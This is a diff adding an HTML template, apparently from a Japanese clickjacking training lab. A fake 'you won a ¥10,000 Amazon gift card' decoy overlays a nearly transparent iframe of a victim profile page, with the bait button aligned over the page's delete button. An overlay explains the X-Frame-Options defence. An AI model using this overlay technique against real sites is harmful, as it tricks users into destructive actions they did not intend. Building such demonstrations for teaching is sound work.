@@ -1,0 +1,139 @@
+<!doctype html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<title>🎁 プレゼント当選のお知らせ</title>
+<link rel="stylesheet" href="{{ url_for('static', filename='app.css') }}">
+<style>
+  html, body {
+    margin: 0;
+    padding: 0;
+    overflow: hidden;
+  }
+
+  /* ===== 攻撃ステージ: ウィンドウ全体を覆う ===== */
+  /* position:fixed + inset:0 でブラウザUIのズレに関わらず完全に画面を埋める。 */
+  /* デコイボタンは絶対配置 (top/left 固定) — iframe だけがスライダーで動く。 */
+  .stage {
+    position: fixed;
+    inset: 0;
+    overflow: hidden;
+    background: linear-gradient(135deg, #fff9e6, #fff3cd);
+  }
+
+  /* Layer 1: 攻撃者の偽ページ（デコイ）— クリックは受け取らない */
+  .decoy {
+    position: absolute;
+    inset: 0;
+    z-index: 1;
+    padding: 32px 36px;
+    pointer-events: none; /* クリックは背面 iframe が受け取る */
+  }
+  .decoy-logo  { font-size: 2.4rem; margin-bottom: 8px; }
+  .decoy-title { font-size: 1.5rem; font-weight: bold; color: #c0392b; margin-bottom: 10px; }
+  .decoy-body  {
+    font-size: .95rem; color: #444; line-height: 1.7;
+    margin-bottom: 0;
+  }
+  .decoy-body strong { color: #c0392b; }
+
+  /* デコイボタン: iframe の削除ボタンに重なる固定絶対位置              */
+  /* iframe は left:50% margin-left:-430px で中央配置 (860px幅)         */
+  /* 削除ボタン位置: iframe左端から +87px → 画面中央から -430+87=-343px  */
+  /* Y=-220 のとき: コンテンツY=343px がステージY=123px に来る           */
+  .fake-btn {
+    position: absolute;
+    top: 156px;
+    left: calc(50% - 343px);  /* 画面中央から iframe の削除ボタン位置に合わせる */
+    background: #e74c3c;
+    color: #fff;
+    border: none;
+    padding: 8px 18px;
+    border-radius: 7px;
+    font-size: .88rem;
+    font-weight: 700;
+    cursor: pointer;
+    box-shadow: 0 4px 14px rgba(231,76,60,.4);
+    pointer-events: none; /* クリック受取は iframe */
+    line-height: 1.4;
+    white-space: nowrap;
+  }
+
+  /* Layer 2: 被害者サイトの iframe（ほぼ透明・クリックを受け取る） */
+  /* 固定 860px 幅・画面中央に配置。中央化することで内部コンテンツの    */
+  /* 位置 (max-width:760px, margin:auto) が画面幅に関わらず一定になる。  */
+  #victim-frame {
+    position: absolute;
+    z-index: 2;
+    top: 0;
+    left: 50%;
+    margin-left: -430px;  /* 860px / 2 を引いて中央に */
+    width: 860px;
+    height: 2000px;
+    border: none;
+    opacity: 0.05;
+    transform: translate(0px, -220px);
+  }
+
+  /* iframe がブロックされたとき */
+  .blocked-overlay {
+    position: absolute;
+    inset: 0;
+    z-index: 3;
+    display: none;
+    background: rgba(0,0,0,.75);
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    text-align: center;
+    color: #2ecc71;
+    font-size: 1rem;
+    padding: 24px;
+  }
+  .blocked-overlay.show { display: flex; }
+  .blocked-overlay .shield { font-size: 3rem; margin-bottom: 16px; }
+  .blocked-overlay strong { font-size: 1.1rem; display: block; margin-bottom: 8px; }
+</style>
+</head>
+<body>
+
+<div class="stage" id="stage">
+
+  <!-- Layer 1: 攻撃者の偽ページ（デコイ）-->
+  <div class="decoy">
+    <div class="decoy-logo">🎁</div>
+    <div class="decoy-title">プレゼント当選のお知らせ</div>
+    <div class="decoy-body">
+      おめでとうございます！<br>
+      あなたは<strong>Amazon ギフト券 ¥10,000</strong>に当選しました。<br><br>
+      下のボタンをクリックして当選を確認してください。<br>
+      キャンペーン期間内（本日 23:59 まで）にご確認ください。
+    </div>
+    <!-- デコイボタン: z-index は低く、クリックは受け取らない。位置だけ削除ボタンに合わせる -->
+    <button class="fake-btn">✔ 当選を確認する →</button>
+  </div>
+
+  <!-- Layer 2: 被害者サイトの iframe（ほぼ透明・クリックを受け取る）-->
+  <iframe id="victim-frame"
+          src="{{ url_for('profile_embed') }}"
+          title="victim"
+          sandbox="allow-forms allow-same-origin allow-scripts">
+  </iframe>
+
+  <!-- X-Frame-Options でブロックされたとき表示 -->
+  <div class="blocked-overlay" id="blocked-msg">
+    <div class="shield">🛡</div>
+    <strong>X-Frame-Options: DENY</strong>
+    ブラウザが iframe の読み込みを拒否しました。<br><br>
+    <span style="color:#aaa;font-size:.88rem">
+      クリックジャッキング攻撃は無効です。<br>
+      <a href="{{ url_for('settings') }}" target="_blank" style="color:#2ecc71">対策設定</a> から
+      X-Frame-Options を OFF にすると攻撃が有効になります。
+    </span>
+  </div>
+
+</div>
+
+<script src="{{ url_for('static', filename='cj_stage.js') }}"></script>
+</body>
+</html>
